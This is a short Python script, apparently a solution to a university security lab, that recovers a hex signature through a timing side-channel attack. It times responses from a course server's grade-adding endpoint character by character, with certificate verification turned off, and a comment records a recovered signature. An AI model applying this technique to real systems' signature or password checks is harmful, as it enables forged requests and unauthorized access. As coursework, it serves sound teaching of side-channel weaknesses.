import requests as r
from numpy import argmax
import time

chars = 'abcdef1234567890'

def rtt(sig:str, samples=1) -> float:
    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
    times = []
    ans = "---"
    for i in range(samples):
        time.sleep(0.2)
        res = r.get(url, params={
            "name" : "Kalle",
            "grade" : 5,
            "signature" : sig
            }, verify=False)
        times.append(res.elapsed.total_seconds())
        ans = res.text.strip()
    avgtime = sum(times)/samples
    print("sig:", sig, "time:", avgtime)
    return (avgtime, False if ans == '0' else True)

if __name__ == '__main__':
    # signature: 6823ea50b133c58cba36
    # time: 0.6456826666666667
    prev = ''
    found = False
    while (not found):
        resps = [ rtt(prev + c, samples=3) for c in chars ]
        unzipped = list(zip(*resps))
        times, status = unzipped[0], unzipped[1]
        found = True in status
        prev += chars[argmax(times)]
        print(max(times))
        print(prev)

